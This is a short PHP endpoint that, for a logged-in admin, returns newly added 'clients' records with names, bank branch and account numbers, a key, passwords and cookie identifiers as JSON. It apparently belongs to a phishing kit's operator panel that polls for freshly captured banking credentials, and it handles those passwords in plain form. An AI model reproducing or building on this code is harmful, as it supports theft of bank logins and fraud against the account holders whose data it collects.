<?php
// File: admin/novos_clientes.php


header('Content-Type: application/json');
require __DIR__ . '/../../includes/db.php';
session_start();

if (empty($_SESSION['admin'])) {
  echo json_encode([]); // Em vez de http_response_code(403)
  exit;
}


$lastId = intval($_GET['last_id'] ?? 0);

$stmt = $pdo->prepare("
  SELECT id, nome, agencia, conta, digito, chave, senha, status, created_at, identificador_cookie
  FROM clients
  WHERE id > ?
  ORDER BY id ASC
");
$stmt->execute([$lastId]);

echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
